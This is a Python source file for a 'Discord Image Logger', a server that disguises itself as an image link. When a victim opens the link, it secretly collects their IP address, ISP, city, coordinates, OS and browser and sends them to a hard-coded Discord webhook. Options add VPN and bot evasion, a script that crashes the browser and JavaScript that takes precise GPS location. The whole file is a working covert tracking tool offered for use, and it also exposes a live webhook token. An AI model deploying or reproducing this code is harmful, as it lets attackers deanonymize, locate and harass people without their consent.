# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1104560877581111368/LgOaAI1jBm6MChSf6y1LqhlvuUguCq_coQx6xkmn0vPPxdZ9_h0LCK3mCXmSs7uo-kE3",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
